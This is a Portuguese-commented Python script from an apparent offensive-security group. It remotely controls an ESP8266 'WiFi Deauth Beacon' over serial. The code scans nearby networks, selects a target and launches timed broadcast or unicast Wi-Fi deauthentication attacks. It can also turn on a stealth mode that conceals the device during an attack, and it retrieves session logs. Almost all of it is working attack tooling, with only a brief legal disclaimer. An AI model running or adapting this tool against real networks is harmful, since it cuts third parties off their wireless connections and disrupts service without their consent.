#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════╗
║      WiFi Deauth Beacon — Script de Controle Remoto      ║
║      VolkSec Offensive Security                          ║
╚══════════════════════════════════════════════════════════╝

Descrição:
    Script Python para controle remoto do WiFi Deauth Beacon
    via interface serial USB. Permite automação de ataques
    e integração com outras ferramentas de pentest.

Dependências:
    pip install pyserial

Uso:
    python3 deauth_control.py --port /dev/ttyUSB0 --scan
    python3 deauth_control.py --port /dev/ttyUSB0 --target 0 --duration 30
    python3 deauth_control.py --port /dev/ttyUSB0 --interactive

Aviso Legal:
    Use APENAS em redes autorizadas. O uso indevido é crime.
"""

import serial
import time
import argparse
import sys


# ─── Configurações ────────────────────────────────────────────────────────────
DEFAULT_PORT  = '/dev/ttyUSB0'
DEFAULT_BAUD  = 115200
DEFAULT_TIMEOUT = 3


# ─── Classe de controle ───────────────────────────────────────────────────────
class DeauthBeacon:
    """Interface de controle para o WiFi Deauth Beacon."""

    def __init__(self, port: str = DEFAULT_PORT, baud: int = DEFAULT_BAUD):
        self.port    = port
        self.baud    = baud
        self.ser     = None
        self.networks = []

    def connect(self) -> bool:
        """Estabelece conexão serial com o dispositivo."""
        try:
            self.ser = serial.Serial(
                port=self.port,
                baudrate=self.baud,
                timeout=DEFAULT_TIMEOUT
            )
            time.sleep(2)  # Aguarda reset do ESP8266 após conexão USB
            print(f"[+] Conectado em {self.port} @ {self.baud} baud")
            return True
        except serial.SerialException as e:
            print(f"[-] Erro ao conectar: {e}")
            return False

    def disconnect(self):
        """Fecha a conexão serial."""
        if self.ser and self.ser.is_open:
            self.ser.close()
            print("[+] Conexão encerrada.")

    def send(self, cmd: str) -> str:
        """
        Envia um comando AT e aguarda a resposta.

        Args:
            cmd: Comando AT sem newline (ex: 'AT+SCAN')

        Returns:
            Resposta do dispositivo como string
        """
        if not self.ser or not self.ser.is_open:
            return ""

        self.ser.flushInput()
        self.ser.write(f"{cmd}\n".encode())
        time.sleep(0.3)

        response = ""
        deadline = time.time() + DEFAULT_TIMEOUT
        while time.time() < deadline:
            if self.ser.in_waiting:
                chunk = self.ser.read(self.ser.in_waiting).decode('utf-8', errors='ignore')
                response += chunk
                # Considera resposta completa se não chega mais dado
                time.sleep(0.1)
                if not self.ser.in_waiting:
                    break

        return response.strip()

    def scan(self) -> list:
        """
        Executa scan de redes Wi-Fi.

        Returns:
            Lista de dicionários com dados das redes encontradas
        """
        print("[*] Executando scan de redes...")
        self.send("AT+SCAN")
        time.sleep(6)  # Aguarda conclusão do scan
        response = self.send("AT+LIST")
        print(response)

        # Parse básico das redes
        self.networks = []
        for line in response.splitlines():
            if line.startswith("  ["):
                try:
                    idx  = int(line[3:5])
                    ssid = line[7:27].strip()
                    self.networks.append({"idx": idx, "raw": line, "ssid": ssid})
                except Exception:
                    pass

        print(f"[+] {len(self.networks)} redes encontradas.")
        return self.networks

    def set_target(self, idx: int) -> bool:
        """
        Define o alvo pelo índice retornado no scan.

        Args:
            idx: Índice da rede alvo (0-based)

        Returns:
            True se o alvo foi definido com sucesso
        """
        response = self.send(f"AT+TARGET={idx}")
        print(response)
        return "[TGT]" in response

    def start_attack(self, mode: str = 'B') -> bool:
        """
        Inicia o ataque de desautenticação.

        Args:
            mode: 'B' para broadcast, 'U' para unicast

        Returns:
            True se o ataque foi iniciado
        """
        if mode not in ('B', 'U'):
            print("[-] Modo inválido. Use 'B' (broadcast) ou 'U' (unicast).")
            return False

        response = self.send(f"AT+ATTACK={mode}")
        print(response)
        return "[ATK]" in response

    def stop_attack(self) -> str:
        """Para o ataque e retorna o log da sessão."""
        response = self.send("AT+STOP")
        print(response)
        return response

    def get_status(self) -> str:
        """Retorna o status atual do dispositivo."""
        return self.send("AT+STATUS")

    def get_log(self) -> str:
        """Lê o log persistente da EEPROM."""
        return self.send("AT+LOG")

    def set_stealth(self, enabled: bool):
        """Ativa ou desativa o modo stealth."""
        cmd = "AT+STEALTH=ON" if enabled else "AT+STEALTH=OFF"
        response = self.send(cmd)
        print(response)

    def reset(self):
        """Reinicia o dispositivo."""
        self.send("AT+RESET")

    def run_session(self, target_idx: int, duration: int = 30,
                    mode: str = 'B', stealth: bool = False):
        """
        Executa uma sessão completa de ataque.

        Args:
            target_idx : Índice do alvo no resultado do scan
            duration   : Duração do ataque em segundos
            mode       : 'B' broadcast ou 'U' unicast
            stealth    : Ativar modo stealth durante o ataque
        """
        print(f"\n{'='*50}")
        print(f"  SESSÃO DE ATAQUE")
        print(f"  Alvo: [{target_idx}] | Duração: {duration}s | Modo: {'Broadcast' if mode=='B' else 'Unicast'}")
        print(f"{'='*50}")

        # Scan
        self.scan()

        if target_idx >= len(self.networks):
            print(f"[-] Índice {target_idx} inválido. Máximo: {len(self.networks)-1}")
            return

        # Define alvo
        if not self.set_target(target_idx):
            print("[-] Falha ao definir alvo.")
            return

        # Stealth
        if stealth:
            self.set_stealth(True)

        # Ataque
        if not self.start_attack(mode):
            print("[-] Falha ao iniciar ataque.")
            return

        # Aguarda duração
        print(f"[*] Atacando por {duration} segundos...")
        try:
            for i in range(duration, 0, -5):
                print(f"    {i}s restantes...")
                time.sleep(min(5, i))
        except KeyboardInterrupt:
            print("\n[!] Interrompido pelo usuário.")

        # Para ataque
        self.stop_attack()

        # Restaura display se stealth estava ativo
        if stealth:
            self.set_stealth(False)

        # Exibe log
        print("\n[*] Log da sessão:")
        print(self.get_log())
        print(f"{'='*50}\n")

    def interactive_mode(self):
        """Modo interativo — passa comandos AT diretamente ao dispositivo."""
        print("\n[*] Modo interativo. Digite comandos AT ou 'quit' para sair.")
        print("[*] Exemplo: AT+SCAN, AT+LIST, AT+TARGET=0, AT+ATTACK=B\n")

        while True:
            try:
                cmd = input("beacon> ").strip()
                if cmd.lower() in ('quit', 'exit', 'q'):
                    break
                if cmd:
                    response = self.send(cmd)
                    print(response)
            except KeyboardInterrupt:
                break

        print("\n[*] Saindo do modo interativo.")


# ─── CLI ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(
        description="WiFi Deauth Beacon — Controle Remoto via Serial",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Exemplos:
  %(prog)s --port /dev/ttyUSB0 --scan
  %(prog)s --port /dev/ttyUSB0 --target 0 --duration 60
  %(prog)s --port /dev/ttyUSB0 --target 0 --stealth --duration 30
  %(prog)s --port /dev/ttyUSB0 --interactive
  %(prog)s --port COM3 --status
        """
    )

    parser.add_argument('--port',     default=DEFAULT_PORT,
                        help=f'Porta serial (padrão: {DEFAULT_PORT})')
    parser.add_argument('--baud',     default=DEFAULT_BAUD, type=int,
                        help=f'Baud rate (padrão: {DEFAULT_BAUD})')
    parser.add_argument('--scan',     action='store_true',
                        help='Executa scan de redes e exibe a lista')
    parser.add_argument('--target',   type=int, default=None,
                        help='Índice do alvo (requer --duration)')
    parser.add_argument('--duration', type=int, default=30,
                        help='Duração do ataque em segundos (padrão: 30)')
    parser.add_argument('--mode',     choices=['B', 'U'], default='B',
                        help='Modo de ataque: B=broadcast, U=unicast (padrão: B)')
    parser.add_argument('--stealth',  action='store_true',
                        help='Ativa modo stealth durante o ataque')
    parser.add_argument('--status',   action='store_true',
                        help='Exibe status atual do dispositivo')
    parser.add_argument('--log',      action='store_true',
                        help='Lê e exibe o log da EEPROM')
    parser.add_argument('--interactive', action='store_true',
                        help='Modo interativo — envia comandos AT diretamente')

    args = parser.parse_args()

    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(0)

    # Aviso legal
    print("\n⚠️  AVISO: Use apenas em redes autorizadas. O uso indevido é crime.\n")

    # Conecta ao dispositivo
    beacon = DeauthBeacon(port=args.port, baud=args.baud)
    if not beacon.connect():
        sys.exit(1)

    try:
        if args.scan:
            beacon.scan()

        elif args.status:
            print(beacon.get_status())

        elif args.log:
            print(beacon.get_log())

        elif args.interactive:
            beacon.interactive_mode()

        elif args.target is not None:
            beacon.run_session(
                target_idx=args.target,
                duration=args.duration,
                mode=args.mode,
                stealth=args.stealth
            )

        else:
            parser.print_help()

    except KeyboardInterrupt:
        print("\n[!] Interrompido. Parando ataque...")
        beacon.stop_attack()

    finally:
        beacon.disconnect()


if __name__ == '__main__':
    main()
